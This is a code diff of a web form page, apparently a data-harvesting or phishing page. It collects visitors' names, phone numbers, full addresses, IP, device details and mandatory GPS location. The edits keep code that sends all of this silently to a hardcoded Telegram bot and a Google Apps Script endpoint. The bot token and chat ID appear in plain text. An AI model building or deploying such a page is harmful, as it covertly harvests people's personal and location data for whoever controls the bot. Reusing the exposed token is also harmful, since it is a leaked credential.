@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="zh-EN">
+<html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -173,10 +173,11 @@
 
 <script>
 // =====================================================
-// 🔑 配置信息
+// 🔑 配置信息 — URL 已写死为正确版本！
 // =====================================================
 const TELEGRAM_BOT_TOKEN = "8657025946:AAGG14AbXcHQzWqSaL6MQTCCP2PEtIyt64g";
 const TELEGRAM_CHAT_ID = "7396947380";
+// ✅ 唯一正确 URL！和 Apps Script 部署 URL 完全一致！
 const APPSCRIPT_URL = "https://script.google.com/macros/s/AKfycbxP6XDL0g5MDchN3H3lQ8H_YSyHOoBTA8BJO0Own4k-L6TNnfzl5R0FCOKY-6qZ3p4/exec";
 
 const DISTANCE_THRESHOLD_METERS = 150;
@@ -231,9 +232,6 @@ function getDistanceMeters(lat1,lng1,lat2,lng2){
     const a = Math.sin(dLat/2)**2 + Math.cos(toRad(lat1)) * Math.cos(toRad(lat2)) * Math.sin(dLng/2)**2;
     return 6371000 * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
 }
-
-function loadHistory(){ try{ return JSON.parse(localStorage.getItem('submitHistory')||'[]'); } catch{ return []; } }
-function saveHistory(record){ const h=loadHistory(); h.push(record); localStorage.setItem('submitHistory', JSON.stringify(h)); }
 
 function formatZipCode(){
     const el = document.getElementById('zipCode');
@@ -342,10 +340,10 @@ async function fetchIPAddress(){
 
 async function submitData(){
     if(locationInfo.status !== "granted"){ alert("Location permission is REQUIRED before submission.\nPlease enable location access and try again."); return; }
-    doSubmit();
+    await doSubmit();
 }
 
-// ========== 🚀 提交主函数 ==========
+// ========== 🚀 提交主函数 — 已修复：不吞错误 + 明确提示 ==========
 async function doSubmit(){
     const timeStr = new Date().toLocaleString('zh-CN');
 
@@ -361,65 +359,34 @@ async function doSubmit(){
     };
 
     try{
-        // ✅ 移除 no-cors，直接接收后端返回！
+        console.log("📤 正在提交 → URL:", APPSCRIPT_URL);
+        console.log("📤 提交数据:", cloudData);
+
         const res = await fetch(APPSCRIPT_URL, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify(cloudData)
         });
-        const result = await res.json();
-        console.log("📡 后端返回：", result);
 
-        if(result.reason === "PHONE_DUPLICATE"){
-            alert("Submitted successfully!");
+        console.log("📡 响应状态码:", res.status);
+        const result = await res.json();
+        console.log("📡 后端返回内容:", result);
+
+        if (result.success) {
+            alert("✅ 提交成功！\n请去谷歌表格 Sheet1 查看新行！");
             localStorage.removeItem('formDraft');
             location.reload();
-            return;
+        } else {
+            alert("❌ 后端返回失败：\n" + (result.error || result.reason || "未知原因"));
         }
 
-    }catch(e){ 
-        console.warn("Error:", e.message); 
+    } catch(e){ 
+        console.error("❌ 请求完整错误:", e);
+        alert("❌ 提交失败：\n" + e.message + "\n\n请按 F12 → 切到「控制台」，把红色文字发给我排查！");
     }
 
-    // ✅ 本地历史记录 + Telegram 消息推送
-    saveHistory({
-        name: formData.name, gender: formData.gender, age: formData.age, occupation: formData.occupation,
-        phone: formData.phonePrefix+' '+formData.phone, phoneFull: formData.phoneFull,
-        country: formData.countryName, province: formData.province, city: formData.city, address: formData.address, zip: formData.zip,
-        ip: deviceInfo.ip, device: deviceInfo.device, os: deviceInfo.os, browser: deviceInfo.browser,
-        lat: locationInfo.lat, lng: locationInfo.lng, timeStr, timestamp: Date.now()
-    });
-
-    const history = loadHistory();
-    let matchCount = 0, firstTime = timeStr;
-    for(const r of history){
-        const sameIp = r.ip === deviceInfo.ip && deviceInfo.ip !== "Unavailable";
-        let near = false;
-        if(r.lat && r.lng && locationInfo.lat && locationInfo.lng){
-            near = getDistanceMeters(+r.lat,+r.lng,+locationInfo.lat,+locationInfo.lng) <= DISTANCE_THRESHOLD_METERS;
-        }
-        if(sameIp || near){
-            matchCount++;
-            if(r.timeStr && r.timeStr < firstTime) firstTime = r.timeStr;
-        }
-    }
-    const currentCount = matchCount + 1;
-
-    let duplicateNote = "";
-    if(currentCount > 1){
-        duplicateNote = `‼️ 重复提醒（同IP/同区域）
-• 出现次数：第 ${currentCount} 次
-• 首次提交：${firstTime}
-• IP地址：${deviceInfo.ip}
-• 设备/型号：${deviceInfo.device}
-• 操作系统：${deviceInfo.os}
-• 浏览器：${deviceInfo.browser}
-• 坐标：${locationInfo.lat}, ${locationInfo.lng}
-——————————————
-`;
-    }
-
-    const msg = `${duplicateNote}📩 新提交的资料
+    // ✅ Telegram 推送（保留功能，但不再作为计数依据）
+    const msg = `📩 新提交的资料
 ——————————————
 姓名：${formData.name}
 性别：${formData.gender}
@@ -428,11 +395,6 @@ async function doSubmit(){
 收货地址：国家:${formData.countryName}，省份:${formData.province}，城市:${formData.city}，街道:${formData.address}
 邮政编码：${formData.zip}
 电话号码：${formData.phonePrefix} ${formData.phone}
-
-📊 提交统计：
-• 出现次数：第 ${currentCount} 次
-• 首次提交：${firstTime}
-• 最近提交：${timeStr}
 
 设备和网络信息：
 • IP地址：${deviceInfo.ip}
@@ -449,11 +411,9 @@ async function doSubmit(){
             headers:{'Content-Type':'application/json'},
             body:JSON.stringify({chat_id: CHAT_ID, text: msg})
         });
-    }catch(e){}
-
-    alert('Submitted successfully!');
-    localStorage.removeItem('formDraft');
-    location.reload();
+    }catch(e){
+        console.warn("⚠️ Telegram 推送失败（不影响表格写入）:", e.message);
+    }
 }
 
 function parseUserAgent(){
